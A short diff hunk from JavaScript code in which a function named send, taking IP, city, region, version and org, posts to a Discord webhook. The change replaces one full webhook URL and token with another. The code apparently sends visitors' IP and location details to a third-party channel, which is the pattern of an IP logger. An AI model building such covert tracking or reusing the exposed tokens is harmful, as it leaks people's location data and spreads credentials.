@@ -30,7 +30,7 @@ function send(ip,city,region,version,org) {
 
 fetch(
 
-  'https://discord.com/api/webhooks/1310107888949137479/-b4M8Rvs2uqvio6LtQMVmmZuYQtIwd62_CL18WTJiI6EiyCsNXhYoCgCcSR-lQsx7PjB',
+  'https://discord.com/api/webhooks/1338309658762416148/sOCXDOB7McRprjioPsD-0XZYmJGehhT7q1w4zdkxemEv9UTmQTfH4lZCg2cfWkNPsiR5',
 
   {
 
